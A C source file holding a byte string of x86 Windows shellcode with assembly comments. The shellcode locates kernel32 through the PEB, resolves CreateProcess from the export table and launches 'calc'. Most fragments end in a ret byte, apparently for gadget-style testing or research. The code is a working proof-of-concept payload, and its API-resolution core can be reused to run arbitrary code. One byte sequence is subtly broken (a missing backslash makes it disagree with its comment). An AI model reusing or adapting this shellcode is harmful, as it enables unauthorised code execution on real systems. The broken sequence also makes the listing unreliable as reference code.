#include "test_code.h"

const char* TEST_CODE =
"\x31\xDB\xC3"
//mov edi, [fs:ebx+0x30];ret
"\x64\x8b\x7b\x30\xC3"
//mov edi, [edi+0x0c]
"\x8B\x7F\x0C\xC3"
//mov edi, [edi+0x1c];ret
"\x8B\x7F\x1C\xC3"
//mov eax, [edi+0x08]
"\x8B\x47\x08\xC3"
//mov esi, [edi+0x20]
//ret
"x8B\x77\x20\xC3"
//additional
//mov edi, [edi];ret
"\x8B\x3F\xC3"
//cmp    BYTE PTR [esi+0xc],0x33
//jne    0xfffffff4
"\x80\x7e\x0c\x33\x75\xf2"
//mov edi, eax
"\x89\xC7\xC3"
//add edi, [eax+0x3c]
//ret
"\x03\x78\x3C\xC3"
//mov edx, [edi+0x78]
"\x8B\x57\x78\xC3"
//add edx, eax
//ret
"\x01\xC2\xC3"
//mov edi, [edx+0x20]
"\x8B\x7A\x20\xC3"
//add edi, eax
//ret
"\x01\xC7\xC3"
//mov ebp, ebx;ret
"\x89\xDD\xC3"
//mov esi, [edi+ebp*4]
"\x8B\x34\xAF\xC3"
//add esi, eax
//ret
"\x01\xC6\xC3"
//inc ebp
//ret
"\x45\xC3"
//cmp    DWORD PTR [esi],0x61657243
"\x81\x3e\x43\x72\x65\x61"
//additional
//jne    0xfffffff4
"\x75\xf2"
//cmp DWORD PTR [esi+8], 0x7365636f
"\x81\x7E\x08\x6F\x63\x65\x73"
//additional
//jne    0xffffffeb
"\x75\xe9"
//mov edi, [edx+0x24]
"\x8B\x7A\x24\xC3"
//add edi, eax
//ret
"\x01\xC7\xC3"
//mov bp, [edi+ebp*2]
//ret
"\x66\x8B\x2C\x6F\xC3"
//mov edi, [edx+0x1C]
"\x8B\x7A\x1C\xC3"
//add edi, eax
//ret
"\x01\xC7\xC3"
//mov edi, [edi+(ebp-1)*4] ;subtract ordinal base
"\x8B\x7C\xAF\xFC\xC3"
//add edi, eax
//ret
"\x01\xC7\xC3"
//mov ecx, ebx
"\x89\xD9\xC3"
//mov cl, 0xFF
//ret
"\xB1\xFF\xC3"
//push ebx
//ret
"\x53\xC3"
//loop   0xffffffff
"\xE2\xFD"
//push 0x636c6163
"\x68\x63\x61\x6C\x63\xC3"
//mov edx, esp
//ret
"\x89\xE2\xC3"
//push edx ;__out        LPPROCESS_INFORMATION lpProcessInformation
"\x52\xC3"
//push edx ;__in         LPSTARTUPINFO lpStartupInfo,
//ret
"\x52\xC3"
//push ebx ;__in_opt     LPCTSTR lpCurrentDirectory,
"\x53\xC3"
//push ebx ;__in_opt     LPVOID lpEnvironment,
//ret
"\x53\xC3"
//push ebx ;__in         DWORD dwCreationFlags,
"\x53\xC3"
//push ebx ;__in         BOOL bInheritHandles,
"\x53\xC3"
//push ebx ;__in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,
"\x53\xC3"
//push ebx ;__in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,
"\x53\xC3"
//push edx ;__inout_opt  LPTSTR lpCommandLine,
"\x52\xC3"
//push ebx ;__in_opt     LPCTSTR lpApplicationName,
"\x53\xC3"
//call edi
"\xFF\xD7";